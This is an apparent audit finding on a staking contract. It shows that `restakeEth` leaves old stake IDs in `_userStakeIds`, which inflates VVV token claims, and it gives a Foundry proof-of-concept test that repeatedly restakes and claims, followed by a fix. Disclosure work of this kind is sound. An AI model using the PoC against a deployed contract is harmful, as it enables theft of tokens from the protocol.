# Anyone can `claimVvv` tokens as much as possible by calling `restakeEth` function again and again.

## Summary
See detail.

## Vulnerability Detail
In the `VVVETHStaking.sol` contract when a user initiates a `restakeEth` operation, a new stake is created with a new `stakeId` using the `_stakeEth` function.
However, the old `stakeId` is not removed from the `_userStakeIds` mapping, which maintains a record of stake IDs for each user.
Now old and new stake IDs remains in this array, the accrued VVV calculation will include both stakes and user will get more token.

Scenario(get more by restakeEth):

1. First of all user calls `stakeEth` function with msg.value and gets `stakeId`
2. Using that `stakeId` calls `restakeEth`  function and gets new `stakeId` 
3. Cause old `stakeId` is not removed from the `_userStakeIds` mapping it will be 2
4. After duration completes finally calls `claimVvv` and gets  tokens corresponding to `_userStakeIds`
5. User repeats and gets Vvv tokens


Run this POC in `VVVETHStaking.unit.t.sol`
Run test with `forge test --mt "testRestakeAgainAndAgain" -vvvvv`

```javascript
function testRestakeAgainAndAgain() public {
        vm.startPrank(msg.sender);
        uint256 stakeEthAmount = 1 ether;
        uint256 stakeId = EthStakingInstance.stakeEth{ value: stakeEthAmount }(
            VVVETHStaking.StakingDuration.ThreeMonths
        );
        // forward to first timestamp with released stake
        advanceBlockNumberAndTimestampInSeconds(
            EthStakingInstance.durationToSeconds(VVVETHStaking.StakingDuration.ThreeMonths) + 1
        );

        // restake
        VVVETHStaking.StakingDuration restakeDuration = VVVETHStaking.StakingDuration.SixMonths;
        uint256 restakeId1 = EthStakingInstance.restakeEth(stakeId, restakeDuration);
        // waits till duration complete
        advanceBlockNumberAndTimestampInSeconds(EthStakingInstance.durationToSeconds(restakeDuration) + 1);

        // again restakes
        VVVETHStaking.StakingDuration newRestakeDuration = VVVETHStaking.StakingDuration.ThreeMonths;
        uint256 restakeId2 = EthStakingInstance.restakeEth(restakeId1, newRestakeDuration);
        // again waits till duration complete
        advanceBlockNumberAndTimestampInSeconds(EthStakingInstance.durationToSeconds(restakeDuration) + 1);
        // three userStakeIds
        EthStakingInstance.userStakeIds(msg.sender);
        // see instead of 1e18 generatedVvvAmount is alot more
        uint256 generatedVvvAmount = EthStakingInstance.calculateAccruedVvvAmount();
        EthStakingInstance.claimVvv(generatedVvvAmount);
        // user could claimVvv tokens as much as possible by restakeEth again and again with new stakeId
}
```
## Impact
Anyone can `claimVvvToken` as much as possible by calling `restakeEth` function by new `_stakeId` again and again with single stake amount.

## Tool used

Manual Review

## Recommendation
consider remove the old `stakeId` from the `_userStakeIds` mapping upon `restakeEth`
